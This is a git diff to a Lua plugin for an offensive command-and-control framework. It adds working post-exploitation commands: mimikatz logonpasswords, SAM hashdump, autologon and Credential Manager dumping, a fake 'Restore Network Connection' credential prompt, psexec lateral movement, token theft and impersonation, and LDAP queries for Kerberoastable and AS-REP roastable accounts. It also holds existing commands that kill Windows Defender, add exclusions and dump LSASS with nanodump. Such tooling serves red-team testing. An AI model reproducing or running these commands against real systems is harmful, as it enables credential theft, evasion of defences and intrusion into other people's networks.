@@ -1,4 +1,4 @@
--- Community BOF Tools Plugin
+-- Community Tools Plugin
 -- This plugin provides various BOF (Beacon Object File) tools for penetration testing
 local time = require("time")
 
@@ -40,6 +40,7 @@ end
 
 local cmd_screenshot = command("screenshot", run_screenshot, "Command: situational screenshot <filename>", "T1113")
 cmd_screenshot:Flags():String("filename","screenshot.jpg","filename to save screenshot")
+opsec("screenshot", 9.0)
 
 -- add_net_user
 local function run_add_net_user(cmd)
@@ -64,6 +65,8 @@ end
 local cmd_add_net_user = command("add_net_user", run_add_net_user, "Add a new user account <username> <password>", "T1136.001")
 cmd_add_net_user:Flags():String("username", "", "the username to add")
 cmd_add_net_user:Flags():String("password", "", "the password to set")
+
+opsec("add_net_user", 9.0)
 
 -- curl
 local function run_curl(args,cmd)
@@ -141,6 +144,8 @@ end
 
 local cmd_readfile = command("readfile", run_readfile, "Read file content <filepath>", "T1005")
 cmd_readfile:Flags():String("filepath", "", "path to the file to read")
+opsec("readfile", 9.0)
+
 
 -- kill_defender
 local function run_kill_defender(args,cmd)
@@ -163,6 +168,7 @@ end
 
 local cmd_kill_defender = command("kill_defender", run_kill_defender, "Kill or check Windows Defender <action>", "T1562.001")
 cmd_kill_defender:Flags():String("action", "", "action to perform (kill or check)")
+opsec("kill_defender", 9.0)
 
 -- clipboard
 local function run_clipboard(cmd)
@@ -173,6 +179,7 @@ local function run_clipboard(cmd)
 end
 
 local cmd_clipboard = command("clipboard", run_clipboard, "Get clipboard content", "T1115")
+opsec("clipboard", 9.0)
 
 -- dump_clipboard
 local function run_dump_clipboard(cmd)
@@ -183,6 +190,7 @@ local function run_dump_clipboard(cmd)
 end
 
 local cmd_dump_clipboard = command("dump_clipboard", run_dump_clipboard, "Dump clipboard content", "T1115")
+opsec("dump_clipboard", 9.0)
 
 -- dump_wifi
 local function run_dump_wifi(args, cmd)
@@ -210,6 +218,7 @@ end
 
 local cmd_dump_wifi = command("dump_wifi", run_dump_wifi, "Dump WiFi profile credentials <profilename>", "T1555.004")
 cmd_dump_wifi:Flags():String("profilename", "", "WiFi profile name to dump")
+opsec("dump_wifi", 9.0)
 
 help("dump_wifi", [[
 Positional arguments format:
@@ -230,6 +239,7 @@ local function run_enum_wifi(cmd)
 end
 
 local cmd_enum_wifi = command("enum_wifi", run_enum_wifi, "Enumerate WiFi profiles", "T1016")
+opsec("enum_wifi", 9.0)
 
 -- memoryinfo
 local function run_memoryinfo(cmd)
@@ -240,6 +250,7 @@ local function run_memoryinfo(cmd)
 end
 
 local cmd_memoryinfo = command("memoryinfo", run_memoryinfo, "Get system memory information", "T1082")
+opsec("memoryinfo", 9.0)
 
 -- memreader
 local function run_memreader(cmd)
@@ -268,6 +279,7 @@ local cmd_memreader = command("memreader", run_memreader, "Read memory from targ
 cmd_memreader:Flags():String("target-pid", "", "target process ID")
 cmd_memreader:Flags():String("pattern", "", "memory pattern to search")
 cmd_memreader:Flags():String("output-size", "10", "output size limit")
+opsec("memreader", 9.0)
 
 -- dump_sam
 local function run_dump_sam(args, cmd)
@@ -300,6 +312,7 @@ end
 
 local cmd_dump_sam = command("dump_sam", run_dump_sam, "Dump the SAM, SECURITY and SYSTEM registries [location]", "T1012")
 cmd_dump_sam:Flags():String("location", "C:\\Windows\\Temp\\", "folder to save (optional)")
+opsec("dump_sam", 9.0)
 
 help("dump_sam", [[
 Positional arguments format:
@@ -330,6 +343,7 @@ end
 
 local cmd_pingscan = command("pingscan", run_pingscan, "Ping scan target <target>", "T1018")
 cmd_pingscan:Flags():String("target", "", "IP or hostname(eg. 10.10.121.100-10.10.121.120,192.168.0.1/24)")
+opsec("pingscan", 9.0)
 
 -- portscan
 local function run_portscan(cmd)
@@ -352,6 +366,8 @@ end
 local cmd_portscan = command("portscan", run_portscan, "Port scan target <target> <ports> [timeout]", "T1046")
 cmd_portscan:Flags():String("target", "", "IPv4 ranges and CIDR (eg. 192.168.1.128, 192.168.1.128-192.168.2.240, 192.168.1.0/24)")
 cmd_portscan:Flags():String("ports", "", "ports to scan (e.g., 80,443,8080 or 1-1000)")
+
+opsec("portscan", 9.0)
 
 -- add_exclusion
 local function run_add_exclusion(cmd)
@@ -376,6 +392,9 @@ end
 local cmd_add_exclusion = command("add_exclusion", run_add_exclusion, "Add Windows Defender exclusion <type> <data>", "T1562.001")
 cmd_add_exclusion:Flags():String("type", "", "exclusion type (path, process, extension)")
 cmd_add_exclusion:Flags():String("data", "", "exclusion data")
+opsec("add_exclusion", 9.0)
+
+opsec("add_exclusion", 9.0)
 
 -- del_exclusion
 local function run_del_exclusion(cmd)
@@ -397,6 +416,7 @@ end
 local cmd_del_exclusion = command("del_exclusion", run_del_exclusion, "Delete Windows Defender exclusion <type> <data>", "T1562.001")
 cmd_del_exclusion:Flags():String("type", "", "exclusion type (path, process, extension)")
 cmd_del_exclusion:Flags():String("data", "", "exclusion data")
+opsec("del_exclusion", 9.0)
 
 -- dir
 local function run_dir(cmd)
@@ -413,6 +433,7 @@ end
 
 local cmd_dir = command("dir", run_dir, "List directory contents [path]", "T1083")
 cmd_dir:Flags():String("path", ".", "directory path to list")
+opsec("dir", 9.0)
 
 -- enum_dotnet
 local function run_dotnet_enum(cmd)
@@ -423,6 +444,7 @@ local function run_dotnet_enum(cmd)
 end
 
 local cmd_dotnet_enum = command("enum_dotnet", run_dotnet_enum, "Enumerate .NET assemblies", "T1033")
+opsec("enum_dotnet", 9.0)
 
 -- enum_drives
 local function run_enum_drives(cmd)
@@ -433,6 +455,7 @@ local function run_enum_drives(cmd)
 end
 
 local cmd_enum_drives = command("enum_drives", run_enum_drives, "Enumerate system drives", "T1135")
+opsec("enum_drives", 9.0)
 
 -- enum_exclusions
 local function run_enum_exclusions(cmd)
@@ -443,6 +466,7 @@ local function run_enum_exclusions(cmd)
 end
 
 local cmd_enum_exclusions = command("enum_exclusions", run_enum_exclusions, "Enumerate Windows Defender exclusions", "T1518.001")
+opsec("enum_exclusions", 9.0)
 
 -- enum_files
 local function run_enum_files(cmd)
@@ -466,6 +490,7 @@ local cmd_enum_files = command("enum_files", run_enum_files, "Enumerate files <d
 cmd_enum_files:Flags():String("directory", "", "directory path to search")
 cmd_enum_files:Flags():String("pattern", "", "search pattern (e.g., *.txt)")
 cmd_enum_files:Flags():String("keyword", "", "optional keyword filter")
+opsec("enum_files", 9.0)
 
 -- enum_localcert
 local function run_enum_localcert(cmd)
@@ -482,6 +507,7 @@ end
 
 local cmd_enum_localcert = command("enum_localcert", run_enum_localcert, "Enumerate local certificates <store>", "T1553.003")
 cmd_enum_localcert:Flags():String("store", "", "certificate store name")
+opsec("enum_localcert", 9.0)
 
 -- enum_localsessions
 local function run_enum_localsessions(cmd)
@@ -492,6 +518,7 @@ local function run_enum_localsessions(cmd)
 end
 
 local cmd_enum_localsessions = command("enum_localsessions", run_enum_localsessions, "Enumerate local user sessions", "T1033")
+opsec("enum_localsessions", 9.0)
 
 -- ipconfig
 local function run_ipconfig(cmd)
@@ -502,16 +529,18 @@ local function run_ipconfig(cmd)
 end
 
 local cmd_ipconfig = command("ipconfig", run_ipconfig, "Display network configuration", "T1016")
+opsec("ipconfig", 9.0)
 
--- list_dns
-local function run_list_dns(cmd)
+-- enum_dns
+local function run_enum_dns(cmd)
     local session = active()
     local arch = session.Os.Arch
-    local bof_file = bof_path("list_dns", arch)
+    local bof_file = bof_path("enum_dns", arch)
     return bof(session, script_resource(bof_file), {}, true)
 end
 
-local cmd_list_dns = command("list_dns", run_list_dns, "List DNS configuration", "T1016")
+local cmd_enum_dns = command("enum_dns", run_enum_dns, "Enum DNS configuration", "T1016")
+opsec("enum_dns", 9.0)
 
 -- enum_net_user
 local function run_enum_net_user(cmd)
@@ -531,6 +560,7 @@ end
 
 local cmd_enum_net_user = command("enum_net_user", run_enum_net_user, "Enumerate network users [type]", "T1087.002")
 cmd_enum_net_user:Flags():String("type", "all", "enumeration type (all, locked, disabled, active)")
+opsec("enum_net_user", 9.0)
 
 -- query_net_user
 local function run_query_net_user(cmd)
@@ -549,6 +579,7 @@ end
 local cmd_query_net_user = command("query_net_user", run_query_net_user, "Query user information <username> [domain]", "T1087.002")
 cmd_query_net_user:Flags():String("username", "", "username to query")
 cmd_query_net_user:Flags():String("domain", "", "domain name (optional)")
+opsec("query_net_user", 9.0)
 
 -- nslookup
 local function run_nslookup(args, cmd)
@@ -631,6 +662,7 @@ local cmd_nslookup = command("nslookup", run_nslookup, "DNS lookup <hostname> [s
 cmd_nslookup:Flags():String("host", "", "hostname or IP to lookup")
 cmd_nslookup:Flags():String("server", "", "DNS server to use (optional)")
 cmd_nslookup:Flags():String("record-type", "A", "DNS record type (A, NS, CNAME, MX, AAAA, etc.)")
+opsec("nslookup", 9.0)
 
 help("nslookup", [[
 Positional arguments format:
@@ -645,7 +677,7 @@ Flag format:
 ]])
 
 -- route_print
-local function run_route_print(cmd)
+local function run_route_print()
     local session = active()
     local arch = session.Os.Arch
     local bof_file = bof_path("route_print", arch)
@@ -653,6 +685,17 @@ local function run_route_print(cmd)
 end
 
 local cmd_route_print = command("route_print", run_route_print, "Display routing table", "T1016")
+opsec("route_print", 9.0)
+
+-- enum_arp
+local function run_arp()
+    local session = active()
+    local arch = session.Os.Arch
+    local bof_file = bof_path("enum_arp", arch)
+    return bof(session, script_resource(bof_file), {}, true)
+end
+local cmd_enum_arp = command("enum_arp", run_arp, "Enum ARP table", "T1016")
+opsec("enum_arp", 9.0)
 
 -- systeminfo
 local function run_systeminfo(cmd)
@@ -663,6 +706,7 @@ local function run_systeminfo(cmd)
 end
 
 local cmd_systeminfo = command("systeminfo", run_systeminfo, "Display system information", "T1082")
+opsec("systeminfo", 9.0)
 
 -- klist
 local function run_klist(cmd)
@@ -693,6 +737,7 @@ end
 local cmd_klist = command("klist", run_klist, "Interact with cached Kerberos tickets [action] [spn]", "T1558")
 cmd_klist:Flags():String("action", "", "action to perform (get, purge, or empty to list)")
 cmd_klist:Flags():String("spn", "", "target SPN (required for 'get' action)")
+opsec("klist", 9.0)
 
 -- nanodump
 local function run_nanodump(cmd)
@@ -759,14 +804,14 @@ local function run_nanodump(cmd)
 
     -- Parameter validation
     if get_pid_int == 1 and (write_file + use_valid_sig_int + snapshot_int + fork_int + elevate_handle_int +
-        duplicate_elevate_int + use_seclogon_duplicate_int + spoof_callstack_int + use_seclogon_leak_local_int +
-        use_seclogon_leak_remote_int + dup_int + use_silent_process_exit_int + use_lsass_shtinkering_int) ~= 0 then
+            duplicate_elevate_int + use_seclogon_duplicate_int + spoof_callstack_int + use_seclogon_leak_local_int +
+            use_seclogon_leak_remote_int + dup_int + use_silent_process_exit_int + use_lsass_shtinkering_int) ~= 0 then
         error("The parameter --getpid is used alone")
     end
 
     if use_silent_process_exit_int == 1 and (write_file + use_valid_sig_int + snapshot_int + fork_int +
-        elevate_handle_int + duplicate_elevate_int + use_seclogon_duplicate_int + spoof_callstack_int +
-        use_seclogon_leak_local_int + use_seclogon_leak_remote_int + dup_int + use_lsass_shtinkering_int) ~= 0 then
+            elevate_handle_int + duplicate_elevate_int + use_seclogon_duplicate_int + spoof_callstack_int +
+            use_seclogon_leak_local_int + use_seclogon_leak_remote_int + dup_int + use_lsass_shtinkering_int) ~= 0 then
         error("The parameter --silent-process-exit is used alone")
     end
 
@@ -890,10 +935,10 @@ local function run_nanodump(cmd)
 
     -- Pack arguments
     local packed_args = bof_pack("iziiiiiiiiiiiziiizi",
-        pid_num, dump_path, write_file, chunk_size, use_valid_sig_int, fork_int, snapshot_int,
-        dup_int, elevate_handle_int, duplicate_elevate_int, get_pid_int, use_seclogon_leak_local_int,
-        use_seclogon_leak_remote_int, seclogon_leak_remote_binary, use_seclogon_duplicate_int,
-        spoof_callstack_int, use_silent_process_exit_int, silent_process_exit, use_lsass_shtinkering_int)
+            pid_num, dump_path, write_file, chunk_size, use_valid_sig_int, fork_int, snapshot_int,
+            dup_int, elevate_handle_int, duplicate_elevate_int, get_pid_int, use_seclogon_leak_local_int,
+            use_seclogon_leak_remote_int, seclogon_leak_remote_binary, use_seclogon_duplicate_int,
+            spoof_callstack_int, use_silent_process_exit_int, silent_process_exit, use_lsass_shtinkering_int)
 
     local bof_file = bof_path("nanodump", arch)
     return bof(session, script_resource(bof_file), packed_args, true)
@@ -919,6 +964,8 @@ cmd_nanodump:Flags():Bool("shtinkering", false, "use LSASS shtinkering technique
 cmd_nanodump:Flags():Bool("seclogon-duplicate", false, "use SecLogon duplicate")
 cmd_nanodump:Flags():Bool("spoof-callstack", false, "spoof the call stack")
 cmd_nanodump:Flags():String("chunk-size", "", "chunk size in KB (default: 924)")
+
+opsec("nanodump", 9.0)
 
 help("nanodump", [[
 Basic LSASS dump:
@@ -963,6 +1010,7 @@ local function run_mimikatz(args, cmd)
 end
 
 local cmd_mimikatz = command("mimikatz", run_mimikatz, "Execute mimikatz with specified commands", "T1003")
+opsec("mimikatz", 7.0)
 
 help("mimikatz", [[
 Positional arguments format:
@@ -990,4 +1038,342 @@ Note:
 - Most commands require administrator privileges
 - "exit" command is automatically added to prevent hanging
 - No need to manually add "exit" at the end
+]])
+
+-- logonpasswords
+local function run_logonpasswords()
+    local session = active()
+    session = with_context(session, "mimikatz")
+    local arch = session.Os.Arch
+
+    local args = {"privilege::debug","sekurlsa::logonpasswords","exit"}
+
+    local mimikatz_path = "common/mimikatz/mimikatz." .. arch .. ".exe"
+    return execute_exe(session, script_resource(mimikatz_path), args, true, 600, arch, "", new_sac(),callback_context(session))
+end
+
+local cmd_logonpasswords = command("logonpasswords", run_logonpasswords, "Extract logon passwords using mimikatz", "T1003")
+opsec("logonpasswords", 7.0)
+
+-- hashdump
+local function run_hashdump()
+    local session = active()
+    local arch = session.Os.Arch
+    local bof_file = bof_path("hashdump", arch)
+    return bof(session, script_resource(bof_file), {}, true)
+end
+local cmd_hashdump = command("hashdump", run_hashdump, "Dump the SAM, SECURITY and SYSTEM registries", "T1003")
+opsec("hashdump", 9.0)
+
+-- autologon
+local function run_autologon()
+    local session = active()
+    local arch = session.Os.Arch
+    local bof_file = bof_path("autologon", arch)
+    return bof(session, script_resource(bof_file), {}, true)
+end
+local cmd_autologon = command("autologon", run_autologon, "Dump the autologon credentials", "T1003")
+opsec("autologon", 9.0)
+
+-- credman
+local function run_credman()
+    local session = active()
+    local arch = session.Os.Arch
+    local bof_file = bof_path("credman", arch)
+    return bof(session, script_resource(bof_file), {}, true)
+end
+local cmd_credman = command("credman", run_credman, "Dump the Credential Manager credentials", "T1003")
+opsec("credman", 9.0)
+
+-- askcreds
+local function run_askcreds(cmd)
+    local session = active()
+    local prompt = cmd:Flags():GetString("prompt")
+    local note = cmd:Flags():GetString("note")
+    local wait_time = cmd:Flags():GetInt("wait_time")
+    local packed_args = bof_pack("zzi", prompt, note, wait_time)
+    local arch = session.Os.Arch
+    local bof_file = bof_path("askcreds", arch)
+    return bof(session, script_resource(bof_file), packed_args, true)
+end
+local cmd_askcreds = command("askcreds", run_askcreds, "Prompt for credentials", "T1003")
+cmd_askcreds:Flags():String("prompt", "Restore Network Connection", "prompt to display")
+cmd_askcreds:Flags():String("note", "Please verify your Windows user credentials to proceed", "note to display")
+cmd_askcreds:Flags():Int("wait_time", 30, "password to dump credentials for")
+opsec("askcreds", 9.0)
+
+-- psexec
+local function run_psexec(args, cmd)
+    local host = ""
+    local svc_name = ""
+    local svc_path = ""
+
+    -- Check if using positional arguments first
+    if args and #args == 3 then
+        -- Positional argument format: ps_exec host service_name local_path
+        host = args[1]
+        svc_name = args[2]
+        svc_path = args[3]
+    else
+        -- Flag format: ps_exec --host host --service service --path path
+        host = cmd:Flags():GetString("host")
+        svc_name = cmd:Flags():GetString("service")
+        svc_path = cmd:Flags():GetString("path")
+    end
+
+    -- Validate required parameters
+    if host == "" then
+        error("host is required")
+    end
+    if svc_name == "" then
+        error("service name is required")
+    end
+    if svc_path == "" then
+        error("local path to service executable is required")
+    end
+
+    -- Read the service binary file
+    local svc_binary = read(svc_path)
+    if svc_binary == nil or #svc_binary == 0 then
+        error("Service executable not found or is empty: " .. svc_path)
+    end
+
+    -- Construct remote path
+    local remote_path = "\\\\" .. host .. "\\C$\\Windows\\" .. svc_name .. ".exe"
+
+    -- Pack arguments: host, service_name, binary_data, remote_path
+    local packed_args = bof_pack("zzbz", host, svc_name, svc_binary, remote_path)
+
+    local session = active()
+    local arch = session.Os.Arch
+    local bof_file = bof_path("psexec", arch)
+
+    return bof(session, script_resource(bof_file), packed_args, true)
+end
+
+local cmd_ps_exec = command("psexec", run_psexec, "Execute service on target host using psexec <host> <service_name> <local_path>", "T1021.002")
+cmd_ps_exec:Flags():String("host", "", "target host")
+cmd_ps_exec:Flags():String("service", "", "service name")
+cmd_ps_exec:Flags():String("path", "", "local path to service executable")
+opsec("psexec", 9.0)
+
+help("ps_exec", [[
+Positional arguments format:
+  ps_exec DOMAIN-DC AgentSvc /tmp/MyAgentSvc.exe
+  ps_exec 192.168.1.100 TestService C:\tools\service.exe
+
+Flag format:
+  ps_exec --host DOMAIN-DC --service AgentSvc --path /tmp/MyAgentSvc.exe
+  ps_exec --host 192.168.1.100 --service TestService --path C:\tools\service.exe
+
+Note:
+- Requires administrator privileges on target host
+- Service executable will be copied to C:\Windows\ on target
+- Service will be created and started automatically
+]])
+
+-- enum_dc
+local function run_enum_dc(cmd)
+    local session = active()
+    local arch = session.Os.Arch
+
+    if arch ~= "x64" then
+        error("x86 is not supported")
+    end
+
+    local bof_file = bof_path("enum_dc", arch)
+    return bof(session, script_resource(bof_file), {}, true)
+end
+
+local cmd_enum_dc = command("enum_dc", run_enum_dc, "Enumerate domain information using Active Directory Domain Services", "T1018")
+opsec("enum_dc", 9.0)
+
+-- make_token
+local function run_make_token(cmd)
+    local username = cmd:Flags():GetString("username")
+    local password = cmd:Flags():GetString("password")
+    local domain = cmd:Flags():GetString("domain")
+    local logon_type = cmd:Flags():GetString("type")
+
+    if username == "" then
+        error("username is required")
+    end
+    if password == "" then
+        error("password is required")
+    end
+    if domain == "" then
+        error("domain is required")
+    end
+    if logon_type == "" then
+        logon_type = "9"  -- Default to NewCredentials
+    end
+
+    -- Validate logon type
+    local valid_types = {["2"] = true, ["3"] = true, ["4"] = true, ["5"] = true, ["8"] = true, ["9"] = true}
+    if not valid_types[logon_type] then
+        error("Invalid logon type. Valid types: 2 (Interactive), 3 (Network), 4 (Batch), 5 (Service), 8 (NetworkCleartext), 9 (NewCredentials)")
+    end
+
+    local packed_args = bof_pack("ZZZi", username, password, domain, tonumber(logon_type))
+    local session = active()
+    local arch = session.Os.Arch
+    local bof_file = bof_path("make_token", arch)
+    return bof(session, script_resource(bof_file), packed_args, true)
+end
+
+local cmd_make_token = command("make_token", run_make_token, "Create impersonated token from credentials <username> <password> <domain> [type]", "T1134.001")
+cmd_make_token:Flags():String("username", "", "username for token creation")
+cmd_make_token:Flags():String("password", "", "password for token creation")
+cmd_make_token:Flags():String("domain", "", "domain for token creation")
+cmd_make_token:Flags():String("type", "9", "logon type (2-Interactive, 3-Network, 4-Batch, 5-Service, 8-NetworkCleartext, 9-NewCredentials)")
+opsec("make_token", 9.0)
+
+help("make_token", [[
+Create an impersonated token from given credentials:
+  make_token --username admin --password P@ssword --domain domain.local --type 8
+  make_token --username admin --password P@ssword --domain domain.local
+
+Logon types:
+  2 - Interactive
+  3 - Network
+  4 - Batch
+  5 - Service
+  8 - NetworkCleartext
+  9 - NewCredentials (default)
+]])
+
+-- steal_token
+local function run_steal_token(cmd,args)
+    local pid
+    if args and #args == 1 then
+        pid = args[1]
+    else
+        pid = cmd:Flags():GetString("pid")
+    end
+
+    if pid == "" then
+        error("process ID is required")
+    end
+
+    -- Validate PID is numeric
+    local pid_num = tonumber(pid)
+    if pid_num == nil or pid_num < 0 then
+        error("Invalid process ID: " .. pid)
+    end
+
+    local packed_args = bof_pack("i", pid_num)
+    local session = active()
+    local arch = session.Os.Arch
+    local bof_file = bof_path("steal_token", arch)
+    return bof(session, script_resource(bof_file), packed_args, true)
+end
+
+local cmd_steal_token = command("steal_token", run_steal_token, "Steal access token from a process <pid>", "T1134.001")
+cmd_steal_token:Flags():String("pid", "", "process ID to steal token from")
+opsec("steal_token", 9.0)
+
+help("steal_token", [[
+Steal access token from a process:
+  steal_token 1234
+  steal_token --pid 1234
+
+Note:
+- Requires appropriate privileges to access target process
+- Target process must have a valid access token
+]])
+
+-- ldapsearch
+local function run_ldapsearch(args, cmd)
+    local query = ""
+    local attributes = ""
+    local result_count = ""
+    local hostname = ""
+    local domain = ""
+
+    -- Check if using positional arguments first
+    if args and #args >= 1 then
+        -- Positional argument format: ldapsearch query [attributes] [result_count] [hostname] [domain]
+        query = args[1] or ""
+        attributes = args[2] or ""
+        result_count = args[3] or "0"
+        hostname = args[4] or ""
+        domain = args[5] or ""
+    else
+        -- Flag format
+        query = cmd:Flags():GetString("query")
+        attributes = cmd:Flags():GetString("attributes")
+        result_count = cmd:Flags():GetString("result-count")
+        hostname = cmd:Flags():GetString("hostname")
+        domain = cmd:Flags():GetString("domain")
+    end
+
+    if query == "" then
+        error("LDAP query is required")
+    end
+
+    -- Set defaults
+    if attributes == "" then
+        attributes = ""  -- Empty string means get all attributes
+    end
+    if result_count == "" then
+        result_count = "0"  -- 0 means get all results
+    end
+    if hostname == "" then
+        hostname = ""  -- Empty string means use Primary DC
+    end
+    if domain == "" then
+        domain = ""  -- Empty string means use Base domain Level
+    end
+
+    -- Validate result_count is numeric
+    local result_limit = tonumber(result_count)
+    if result_limit == nil then
+        error("Invalid result count: " .. result_count)
+    end
+
+    local packed_args = bof_pack("zzizz", query, attributes, result_limit, hostname, domain)
+    local session = active()
+    local arch = session.Os.Arch
+    local bof_file = bof_path("ldapsearch", arch)
+    return bof(session, script_resource(bof_file), packed_args, true)
+end
+
+local cmd_ldapsearch = command("ldapsearch", run_ldapsearch, "Perform LDAP search <query> [attributes] [result_count] [hostname] [domain]", "T1018")
+cmd_ldapsearch:Flags():String("query", "", "LDAP query string")
+cmd_ldapsearch:Flags():String("attributes", "", "comma separated attributes (empty for all)")
+cmd_ldapsearch:Flags():String("result-count", "0", "maximum number of results (0 for all)")
+cmd_ldapsearch:Flags():String("hostname", "", "DC hostname or IP (empty for Primary DC)")
+cmd_ldapsearch:Flags():String("domain", "", "Distinguished Name to use (empty for Base domain)")
+opsec("ldapsearch", 9.0)
+
+help("ldapsearch", [[
+Perform LDAP search with various options:
+  ldapsearch --query "(&(objectClass=user)(samAccountName=admin*))"
+  ldapsearch --query "(&(objectClass=computer))" --attributes "name,operatingSystem" --result-count 10
+
+Positional arguments format:
+  ldapsearch "(&(objectClass=user))" "" 0 "" ""
+  ldapsearch "(&(objectClass=computer))" "name,operatingSystem" 10 "dc01.domain.com" "DC=domain,DC=com"
+
+Useful queries (edit for OPSEC safety):
+
+Kerberoastable accounts:
+  ldapsearch "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"
+
+AS-REP Roastable accounts:
+  ldapsearch "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
+
+Passwords with reversible encryption:
+  ldapsearch "(&(objectClass=user)(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=128))"
+
+For Bloodhound ACL data, add nTSecurityDescriptor:
+  ldapsearch "(&(objectClass=user))" "*,ntsecuritydescriptor"
+
+Defaults:
+- Empty attributes = get all attributes
+- 0 result_count = get all results
+- Empty hostname = use Primary DC
+- Empty domain = use Base domain Level
+
+Note: If paging fails, consider using nonpagedldapsearch instead
 ]])
